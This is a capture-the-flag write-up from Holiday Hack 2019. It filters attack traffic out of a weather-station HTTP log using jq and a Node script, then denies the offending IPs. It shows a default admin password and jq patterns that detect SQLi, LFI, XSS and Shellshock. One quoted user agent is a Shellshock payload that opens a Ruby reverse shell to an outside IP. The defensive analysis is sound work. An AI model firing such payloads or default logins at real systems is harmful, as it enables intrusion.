---
title: Filter out poisoned sources of weather data
tags: 
  - Infosec
  - Web
  - Forensics
categories:
  - Holiday Hack 2019
date: 2020-01-19
---

We're given the link to a web interface and a gzipped log file. First, let's get into the web interface.

You might remember that [challenge 10](recover-document.html) gives you a PDF documenting the new sleigh navigation system. If you browse through this PDF you'll find it mentions the default username/password are in the `README.md`.

If we go to the interface `/README.md`, we can download the readme and find the default password:

```
You can login using the default admin pass:

`admin 924158F9522B3744F5FCD4D10FAC4356`

```

Now that we're in the web interface we can look at the API docs:

```
To Update The Measurements For a Specific Global Elf Weather Station:

HTTP POST REQUEST TO http://srf.elfu.org/api/measurements
Content-Type: application/json

{
  "coord": {
    "lon": 19.04,
    "lat": 47.5
  },
  "weather": [
    {
      "id": 701,
      "main": "Mist",
      "description": "mist",
      "icon": "50d"
    }
  ],
  "base": "stations",
  "main": {
    "temp": 3,
    "pressure": 1016,
    "humidity": 74,
    "temp_min": 3,
    "temp_max": 3
  },
  "visibility": 5000,
  "wind": {
    "speed": 1.5
  },
  "clouds": {
    "all": 75
  },
  "dt": 1518174000,
  "sys": {
    "type": 1,
    "id": 5724,
    "message": 0.0038,
    "country": "HU",
    "sunrise": 1518155907,
    "sunset": 1518191898
  },
  "station_id": "abcd1234",
  "name": "Budapest",
  "cod": 200
}

All Station IDS: GET /api/stations
All Stations Weather Data: GET /api/weather?station_id=*
One Stations Weather Data: GET /api/weather?station_id=abcd1234
Multiple Specific Stations Weather Data: GET /api/weather?station_id=abcd1234,abcd1235
```

So now we know the poison requests will be `POST /api/measurements`. Let's start looking through our logs. First, look at the structure for each object:

```
$ jq '.[0]' http.log
{
  "ts": "2019-10-05T06:50:42-0800",
  "uid": "ClRV8h1vYKWXN1G5ke",
  "id.orig_h": "238.27.231.56",
  "id.orig_p": 60677,
  "id.resp_h": "10.20.3.80",
  "id.resp_p": 80,
  "trans_depth": 1,
  "method": "GET",
  "host": "srf.elfu.org",
  "uri": "/14.10/Google/",
  "referrer": "-",
  "version": "1.0",
  "user_agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)",
  "origin": "-",
  "request_body_len": 0,
  "response_body_len": 232,
  "status_code": 404,
  "status_msg": "Not Found",
  "info_code": "-",
  "info_msg": "-",
  "tags": "(empty)",
  "username": "-",
  "password": "-",
  "proxied": "-",
  "orig_fuids": "-",
  "orig_filenames": "-",
  "orig_mime_types": "-",
  "resp_fuids": "FUPWLQXTNsTNvf33",
  "resp_filenames": "-",
  "resp_mime_types": "text/html"
}
```

We're told there's probably a bunch of nasty stuff, so we can look for common web attack techniques in the logs. We'll match based on some generic stuff then put all the IPs in a file:

```bash
$ # SQLi
$ jq '. | map(select(.uri | contains("'"'"'"))) | map(."id.orig_h")' http.log > bad_ips
$ jq '. | map(select(.user_agent | contains("'"'"'"))) | map(."id.orig_h")' http.log >> bad_ips
$ jq '. | map(select(.username | contains("'"'"'"))) | map(."id.orig_h")' http.log >> bad_ips

$ # LFI
$ jq '. | map(select(.uri | contains("../"))) | map(."id.orig_h")' http.log >> bad_ips
$ jq '. | map(select(.uri | contains("pass"))) | map(."id.orig_h")' http.log >> bad_ips

$ # XSS
$ jq '. | map(select(.uri | contains("<"))) | map(."id.orig_h")' http.log >> bad_ips
$ jq '. | map(select(.host | contains("<"))) | map(."id.orig_h")' http.log >> bad_ips

$ # Shellshock
$ jq '. | map(select(.uri | contains(":; };"))) | map(."id.orig_h")' http.log >> bad_ips
$ jq '. | map(select(.user_agent | contains(":; };"))) | map(."id.orig_h")' http.log >> bad_ips

$ # Flatten a bunch of concatenated arrays
$ jq -s '. | flatten' bad_ips > bad_ips_clean
$ jq '. | length' bad_ips_clean
89
```

This targets, in order, LFI, SQL Injection, Shellshock, and XSS.

Now we can try to find other requests that have things in common with these, such as user agents. You can repeat the above script, replacing `."id.orig_h"` with `.user_agent` to find all the useragents that were responsible for a malicious request.

```
$ cat bad_agents
[
  "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.",
  "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)",
  "Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)",
  [ ... ]
  "() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\"227.110.45.126\",43870).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
]
```

There's a chance some of these are actually normal though, so we'll not use useragents that end up being too common (>= 9 requests). From there, we just need to search for IPs that used any useragent on that list. I used Node for this part:


```js
var fs = require('fs');
var sus_agents = JSON.parse(fs.readFileSync('./bad_agents'));
var all_records = JSON.parse(fs.readFileSync('./http.log'));

var agent_counts = sus_agents.map(x => ({count: all_records.filter(y => y.user_agent == x).length, agent: x}));
console.log("Suspicious agents: " + agent_counts.length);

var bad_agents = agent_counts.filter(x => x.count < 9).map(x => x.agent);
console.log("Probably bad agents: " + bad_agents.length);

var filtered = all_records.filter(x => bad_agents.includes(x.user_agent));
filtered = filtered.filter((x, i) => filtered.indexOf(x) === i);

console.log("Found " + filtered.length + " unique IPs:");
console.log(filtered.map(x => x['id.orig_h']).join(", "));
```

```
$ node pivot.js
Suspicious agents: 89
Probably bad agents: 72
Found 97 unique IPs:
42.103.246.250, 42.103.246.130, 42.103.246.130, 42.103.246.130, ...
```

Now we just need to paste our comma-seperated list into the firewall, hit deny, and we get our token.